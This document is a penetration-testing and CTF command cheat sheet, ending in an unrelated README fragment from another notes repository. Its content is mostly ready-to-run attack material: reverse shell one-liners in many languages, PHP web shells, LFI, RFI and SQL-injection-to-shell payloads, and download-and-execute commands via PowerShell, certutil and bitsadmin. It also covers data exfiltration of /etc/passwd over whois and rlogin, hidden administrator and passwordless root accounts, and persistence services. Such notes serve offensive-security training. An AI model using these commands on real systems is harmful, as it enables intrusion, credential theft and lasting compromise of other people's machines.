Convenient commands for your pentesting / red-teaming engagements, OSCP and CTFs.
Reconnaissance / Enumeration
Extracting Live IPs from Nmap Scan

nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips

Simple Port Knocking

for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done

DNS lookups, Zone Transfers & Brute-Force

whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -> set type=any -> ls -d domain.com
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done

Banner Grabbing

nc -v $TARGET 80
telnet $TARGET 80
curl -vX $TARGET

NFS Exported Shares

List NFS exported shares:

showmount -e 192.168.110.102

...and check if 'rw,no_root_squash' is present. If it is present, compile the below sid-shell.c:
sid-shell.c

#include <unistd.h>

main( int argc, char ** argv, char ** envp )
{
    setgid(0); setuid(0); system("/bin/bash", argv, envp);
    return 0;
}

...upload it to the share and execute the below to launch sid-shell to spawn a root shell:

chown root:root sid-shell; chmod +s sid-shell; ./sid-shell

Kerberos Enumeration

# users
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'

HTTP Brute-Force & Vulnerability Scanning

target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum

RPC / NetBios / SMB

rpcinfo -p $TARGET
nbtscan $TARGET

#list shares
smbclient -L //$TARGET -U ""

# null session
rpcclient -U "" $TARGET
smbclient -L //$TARGET
enum4linux $TARGET

SNMP

# Windows User Accounts
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25

# Windows Running Programs
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2

# Windows Hostname
snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27

# Windows TCP Ports
snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3

# Software Name
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2

# brute-force community strings
onesixtyone -i snmp-ips.txt -c community.txt

snmp-check $TARGET

SMTP

smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150

Active Directory

# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"

Listen on a port (Powershell)

# Start listener on port 443
$listener = [System.Net.Sockets.TcpListener]443; $listener.Start();
 
while($true)
{
    $client = $listener.AcceptTcpClient();
    Write-Host $client.client.RemoteEndPoint "connected!";
    $client.Close();
    start-sleep -seconds 1;
}

Gaining Access
Reverse Shell One-Liners
Bash

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Perl

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

URL-Encoded Perl: Linux

echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew

Python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Netcat without -e #1

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f

Netcat without -e #2

nc localhost 443 | /bin/sh | nc localhost 444
telnet localhost 443 | /bin/sh | telnet localhost 444

Java

r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();

XTerm

xterm -display 10.0.0.1:1

JDWP RCE

print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())

Working with Restricted Shells

# rare cases
ssh bill@localhost ls -l /tmp

nice /bin/bash

Interactive TTY Shells

/usr/bin/expect sh

python -c ‘import pty; pty.spawn(“/bin/sh”)’
# execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.uk
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'

Uploading/POSTing Files Through WWW Upload Forms

# POST file
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"

# POST binary data to web form
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v

PUTing File on the Webhost via PUT verb

curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php

Generating Payload Pattern & Calculating Offset

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE

Bypassing File Upload Restrictions

    file.php -> file.jpg

    file.php -> file.php.jpg

    file.asp -> file.asp;.jpg

    file.gif (contains php code, but starts with string GIF/GIF98)

    00%

    file.jpg with php backdoor in exif (see below)

    .jpg -> proxy intercept -> rename to .php

Injecting PHP into JPEG

exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png

Uploading .htaccess to interpret .blah as .php

AddType application/x-httpd-php .blah

Cracking Passwords
Cracking Web Forms with Hydra

hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoint/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list

Cracking Common Protocols with Hydra

hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1

HashCat Cracking

# Bruteforce based on the pattern;
hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  

# Generate password candidates: wordlist + pattern;
hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout

# Generate NetNLTMv2 with internalMonologue and crack with hashcat
InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
# resulting hash
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000

# crack with hashcat
hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable

Generating Payload with msfvenom

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai

Compiling Code From Linux

# Windows
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe

# Linux
gcc -m32|-m64 -o output source.c

Compiling Assembly from Windows

# https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
nasm -f win64 .\hello.asm -o .\hello.obj

# http://www.godevtool.com/Golink.zip
GoLink.exe -o .\hello.exe .\hello.obj

Local File Inclusion to Shell

nc 192.168.1.102 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close

# Then send as cmd payload via http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id

Local File Inclusion: Reading Files

file:///etc/passwd

http://example.com/index.php?page=php://input&cmd=ls
    POST: <?php system($_GET['cmd']); ?>
http://192.168.2.237/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
    POST: <?php system('uname -a');die(); ?>

expect://whoami
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=id
http://10.1.1.1/index.php?page=data://text/plain,%3C?php%20system%28%22uname%20-a%22%29;%20?%3E

# ZIP Wrapper
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
http://example.com/index.php?page=zip://shell.jpg%23payload.php

# Loop through file descriptors
curl '' -H 'Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d' --output -

Remote File Inclusion Shell: Windows + PHP

<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>

SQL Injection to Shell or Backdoor

# Assumed 3 columns
http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"<?php system($_REQUEST['cmd']);?>",2,3 INTO OUTFILE "c:/evil.php"-- uMj

# sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10

# netcat reverse shell via mssql injection when xp_cmdshell is available
1000';+exec+master.dbo.xp_cmdshell+'(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd';--

SQLite Injection to Shell or Backdoor

ATTACH DATABASE '/home/www/public_html/uploads/phpinfo.php' as pwn; 
CREATE TABLE pwn.shell (code TEXT); 
INSERT INTO pwn.shell (code) VALUES ('<?php system($_REQUEST['cmd']);?>');

MS-SQL Console

mssqlclient.py -port 27900 user:password@10.1.1.1
sqsh -S 10.1.1.1 -U user -P password

Upgradig Non-Interactive Shell

python -c 'import pty; pty.spawn("/bin/sh")'
/bin/busybox sh

Python Input Code Injection

__import__('os').system('id')

Local Enumeration & Privilege Escalation
https://github.com/sagishahar/lpeworkshop
Check AppLocker Policies

Get-AppLockerPolicy -Local).RuleCollections
Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\

Applocker: Writable Windows Directories

# list from https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System

Find Writable Files/Folders in Windows

$a = Get-ChildItem "c:\windows\" -recurse -ErrorAction SilentlyContinue
$a | % {
    $fileName = $_.fullname
    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match "full|modify|write" -and $_.identityreference -match "authenticated users|everyone|$env:username"}
    if($acls -ne $null)
    {
        [pscustomobject]@{
            filename = $fileName
            user = $acls | select -exp identityreference
        }
    }
}

Check if Powershell Logging is Enabled

reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription

Check WinEvent Logs for SecureString Exposure

Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString'

Check WinEvent for Machine Wake/Sleep times

Get-WinEvent -FilterHashTable @{ ProviderName = 'Microsoft-Windows-Power-TroubleShooter'  ; Id = 1 }|Select-Object -Property @{n='Sleep';e={$_.Properties[0].Value}},@{n='Wake';e={$_.Properties[1].Value}}

Audit Policies

auditpol /get /category:*

Check if LSASS is running in PPL

reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

Binary Exploitation with ImmunityDebugger
Get Loaded Modules

# We're interested in modules without protection, Read & Execute permissions
!mona modules

Finding JMP ESP Address

!mona find -s "\xFF\xE4" -m moduleName

Cracking a ZIP Password

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip

Setting up Simple HTTP server

# Linux
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80

MySQL User Defined Fuction Privilge Escalation

Requires raptor_udf2.c and sid-shell.c or full raptor.tar:
151B
sid-shell.c
30KB
raptor.tar
archive

gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/raptor_udf2.so'));
select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');

Docker Privilege Esclation

echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh

Resetting root Password

echo "root:spotless" | chpasswd

Uploading Files to Target Machine
TFTP

#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start

# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file

FTP

# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd

CertUtil

certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe

PHP

<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>

Python

python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"

HTTP: Powershell

powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe')"; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'"
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');

# download using default proxy credentials and launch
powershell -command { $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString("http://$attacker/nc.exe") | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }

HTTP: VBScript

Copy and paste contents of wget.vbs into a Windows Shell and then:

cscript wget.vbs http://$ATTACKER/file.exe localfile.exe

HTTP: Linux

wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$TARGET:tmp/backdoor.py

NetCat

# Attacker
nc -l -p 4444 < /tool/file.exe

# Victim
nc $ATTACKER 4444 > file.exe

HTTP: Windows "debug.exe" Method

# 1. In Linux, convert binary to hex ascii:
wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
# 2. Paste nc.txt into Windows Shell.

HTTP: Windows BitsAdmin

cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe

Wscript Script Code Download & Execution

echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.js

Whois Data Exfiltration

# attacker
nc -l -v -p 43 | sed "s/ //g" | base64 -d
# victim
whois -h $attackerIP -p 43 cat /etc/passwd | base64

Cancel Data Exfiltration

cancel -u "$(cat /etc/passwd)" -h ip:port

rlogin Data Exfiltration

rlogin -l "$(cat /etc/passwd)" -p port host

Bash Ping Sweeper

#!/bin/bash
for lastOctet in {1..254}; do 
    ping -c 1 10.0.0.$lastOctet | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done

Brute-forcing XOR'ed string with 1 byte key in Python

encrypted = "encrypted-string-here"
for i in range(0,255):
    print("".join([chr(ord(e) ^ i) for e in encrypted]))

Generating Bad Character Strings

# Python
'\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])

# Bash
for i in {1..255}; do printf "\\\x%02x" $i; done; echo -e "\r"

Converting Python to Windows Executable (.py -> .exe)

python pyinstaller.py --onefile convert-to-exe.py

Port Scanning with NetCat

nc -nvv -w 1 -z host 1000-2000
nc -nv -u -z -w 1 host 160-162

Port Scanning with Masscan

masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0

Exploiting Vulnerable Windows Services: Weak Service Permissions

# Look for SERVICE_ALL_ACCESS in the output
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

sc config [service_name] binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
sc qc [service_name] (to verify!)
sc start [service_name]

Find File/Folder Permissions Explicitly Set for a Given User

icacls.exe C:\folder /findsid userName-or-*sid /t
//look for (F)ull, (M)odify, (W)rite

AlwaysInstallElevated MSI

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Stored Credentials: Windows

c:\unattend.xml
c:\sysprep.inf
c:\sysprep\sysprep.xml
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
dir /s *cred* == *pass* == *.conf

# Windows Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Registry
reg query HKLM /f password /t REG_SZ /s 
reg query HKCU /f password /t REG_SZ /s

Unquoted Service Path

wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" |findstr /i /v """

Persistence via Services

# cmd
sc create spotlessSrv binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""

# powersehll
New-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName "'C:\Program Files\NotEvil\back.exe'" -Description "Not at all"

Port Forwarding / SSH Tunneling
SSH: Local Port Forwarding

# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER

SSH: Dynamic Port Forwarding

# Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
ssh -D 127.0.0.1:8080 user@SSH_SERVER

SSH: Remote Port Forwarding

# Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
# Scenario: expose RDP on non-routable network;
ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP

Proxy Tunnel

# Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128
# Scenario: a remote host has SSH running, but it's only bound to 127.0.0.1, but you want to reach it;
proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
ssh user@127.0.0.1 -p 5555

HTTP Tunnel: SSH Over HTTP

# Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
hts -F localhost:22 80

# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
htc -F 8080 192.168.1.15:80

# Client - connect to localhost:8080 -> get tunneled to 192.168.1.15:80 -> get redirected to 192.168.1.15:22
ssh localhost -p 8080

Netsh - Windows Port Forwarding

# requires admin
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport

RunAs / Start Process As
PowerShell

# Requires PSRemoting
$username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami }

# without PSRemoting
cmd> powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential 'username', (ConvertTo-SecureString 'password' -AsPlainText -Force))

# without PS Remoting, with arguments
cmd> powershell -command "start-process cmd.exe -argumentlist '/c calc' -Credential (New-Object System.Management.Automation.PSCredential 'username',(ConvertTo-SecureString 'password' -AsPlainText -Force))"

CMD

# Requires interactive console
runas /user:userName cmd.exe

PsExec

psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe

Pth-WinExe

pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe

Recursively Find Hidden Files: Windows

dir /A:H /s "c:\program files"

General File Search

# Query the local db for a quick file find. Run updatedb before executing locate.
locate passwd 

# Show which file would be executed in the current environment, depending on $PATH environment variable;
which nc wget curl php perl python netcat tftp telnet ftp

# Search for *.conf (case-insensitive) files recursively starting with /etc;
find /etc -iname *.conf

Post-Exploitation & Maintaining Access
Browsing Registry Hives

hivesh /registry/file

Decrypting RDG Passwords

Remote Desktop Connection Manager passwords can be decrypted on the same computer/account they were encrypted:

Copy-Item 'C:\Program Files (x86)\Microsoft\Remote Desktop Connection Manager\RDCMan.exe C:\temp\RDCMan.dll’
Import-Module C:\temp\RDCMan.dll
$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
[RdcMan.Encryption]::DecryptString($PwdString, $EncryptionSettings)

Decrypting VNC Password

wine vncpwdump.exe -k key

Creating User and Adding to Local Administrators

net user spotless spotless /add & net localgroup Administrators spotless /add

Hide Newly Created Local administrator

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v spotless /d 0 /f

Creating SSH Authorized Keys

mkdir /root/.ssh 2>/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' >> /root/.ssh/authorized_keys

Creating Backdoor User w/o Password

echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd

# Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is "kali"
sed 's/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./' /etc/shadow > /etc/s2; cat /etc/s2 > /etc/shadow; rm /etc/s2

Creating Another root User

useradd -u0 -g0 -o -s /bin/bash -p openssl passwd yourpass rootuser

Generating OpenSSL Password

openssl passwd -1 password 
# output $1$YKbEkrkZ$7Iy/M3exliD/yJfJVeTn5.

Persistent Back Doors

# Launch evil.exe every 10 minutes
schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe

Code Execution / Application Whitelist Bypass
Ieframe.dll

rundll32 c:\windows\system32\ieframe.dll,OpenURL c:\temp\test.url

This was inspired by and forked/adapted/updated from Dostoevsky's Pentest Notes.his is my attempt to not suck at pentesting by organizing my learning. I have very briefly covered various concepts related to penetration testing, but more importantly I have linked a large array of resources that you can source deep knowledge from.

Still a work in progress, expect regularly updates.

## Table of Contents

[Chapter 1 - Cheatsheets](/chapter-1.md)

[Chapter 2 - Recon & Enumeration](/chapter-2.md)

[Chapter 3 - Exploiting Vulnerabilities](/chapter-3.md)

[Chapter 4 - Windows Post-Exploitation](/chapter-4.md)

[Chapter 5 - Linux Post-Exploitation](/chapter-5.md)

[Chapter 6 - Exploit Development](/chapter-6.md)

[Chapter 7 - Cracking](/chapter-7.md)

[Chapter 8 - Reverse Engineering](/chapter-8.md)

[Chapter 9 - Miscellaneous](/chapter-9.md)

## What have I learned so far?

1. Security is a constantly evolving landscape and it's hard to keep up if you try to learn everything at once; try to stick to one focal point at a time. There is plenty of time to dive into all the interesting concepts, but you need to build fundamentals first \(walk before you run\)
